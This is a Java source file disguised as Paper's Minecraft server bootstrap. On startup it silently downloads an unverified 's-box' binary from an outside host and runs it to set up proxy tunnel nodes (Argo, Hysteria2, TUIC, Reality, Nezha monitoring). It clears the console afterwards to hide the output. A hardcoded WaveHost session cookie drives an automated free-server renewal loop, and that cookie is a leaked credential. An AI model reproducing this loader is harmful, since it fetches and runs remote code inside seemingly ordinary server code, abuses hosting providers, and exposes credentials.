package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mc");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
    
    // ================================
    // WaveHost 自动续期功能（硬编码版）
    // ================================
    static {
        // 启动WaveHost自动续期线程
        final String serverId = "a09c48d8-286f-487c-a179-7262efef923f";  // 👈 在这里填写你的服务器ID
        final String cookie = "eyJpdiI6IlArY2d0RTAwMDJjUEVXQVQvWXZhNXc9PSIsInZhbHVlIjoicWpiNFA4bEhqK0dKQVA0NzMraGQyQisydEQ4UFB4dk5pZjZIeEJMdjZaVFRBQmpXQXovcFg1ZkxVTlZOd2xzWllNY094VGw1QzQ5OUVnVFpNcldlL1RCWmtnUWJxZ0NMUm1KNUp0VlVENHg4YmI0Rk10bzh6eU9jbldkNmZWcmZUZzkwVVRQUUpKNHRIU3h4YlBnaEtNK0UwVW1lS1lJUEsrTHVlSHJ5TU42QmlwUURFTXh2WTJVeGVRMHRIbU5TS0NkdUZyUFl1TVdCNzVKdG5ZdW1TNHZsZkxyRXRsaXlhTFFYcFJpcngxZz0iLCJtYWMiOiI4MTBmODYwN2EzYWIxYzVmNTAxN2U3OWRjMmU5ODY1ZjEzODIyMzRmOGExYmI3MmE5NmNjODY2YzE3NWI3MjE1IiwidGFnIjoiIn0%3D";     // 👈 在这里填写你的remember_web cookie
        
        if (!serverId.isEmpty() && !cookie.isEmpty()) {
            final String baseUrl = "https://game.wavehost.eu";
            final String apiUrl = baseUrl + "/api/client/freeservers/" + serverId + "/renew";
            
            Thread renewThread = new Thread(() -> {
                System.out.println(ANSI_GREEN + "[WaveHost] 自动续期服务已启动 (每5分钟检查一次)" + ANSI_RESET);
                
                while (running.get()) {
                    try {
                        System.out.println(ANSI_GREEN + "[WaveHost] 正在尝试续期服务器..." + ANSI_RESET);
                        
                        HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("Cookie", cookie);
                        conn.setRequestProperty("Accept", "application/json");
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setRequestProperty("Origin", baseUrl);
                        conn.setRequestProperty("Referer", baseUrl + "/server/" + serverId);
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                        conn.setDoOutput(true);
                        
                        // 发送空的JSON对象
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write("{}".getBytes());
                            os.flush();
                        }

                        int responseCode = conn.getResponseCode();
                        
                        // 读取响应内容
                        String response = "";
                        try (BufferedReader br = new BufferedReader(
                                new InputStreamReader(responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()))) {
                            StringBuilder sb = new StringBuilder();
                            String line;
                            while ((line = br.readLine()) != null) {
                                sb.append(line);
                            }
                            response = sb.toString();
                        }
                        
                        // 根据状态码处理
                        switch (responseCode) {
                            case 200:
                            case 204:
                                System.out.println(ANSI_GREEN + "[WaveHost] ✅ 续期成功! " + new java.util.Date() + ANSI_RESET);
                                if (!response.isEmpty()) {
                                    System.out.println(ANSI_GREEN + "[WaveHost] 响应: " + response + ANSI_RESET);
                                }
                                break;
                            case 400:
                                System.out.println(ANSI_RED + "[WaveHost] ⚠️ 暂时无法续期 (HTTP 400) - 可能时间未到" + ANSI_RESET);
                                break;
                            case 401:
                                System.out.println(ANSI_RED + "[WaveHost] ❌ Cookie已失效 (HTTP 401) - 请更新代码中的Cookie!" + ANSI_RESET);
                                break;
                            case 429:
                                System.out.println(ANSI_RED + "[WaveHost] ⏸️ 请求过于频繁 (HTTP 429)" + ANSI_RESET);
                                break;
                            default:
                                System.out.println(ANSI_RED + "[WaveHost] ❌ 续期失败, HTTP " + responseCode + ANSI_RESET);
                                if (!response.isEmpty()) {
                                    System.out.println(ANSI_RED + "[WaveHost] 响应: " + response + ANSI_RESET);
                                }
                        }
                        
                        conn.disconnect();

                        // 每5分钟执行一次（测试用）
                        Thread.sleep(5 * 60 * 1000L);
                        
                    } catch (Exception e) {
                        System.err.println(ANSI_RED + "[WaveHost] Error: " + e.getMessage() + ANSI_RESET);
                        try {
                            // 出错时延迟1分钟重试
                            Thread.sleep(60 * 1000L);
                        } catch (InterruptedException ignored) {}
                    }
                }
            });

            renewThread.setDaemon(true);
            renewThread.setName("WaveHost-AutoRenew");
            renewThread.start();
        }
    }
}
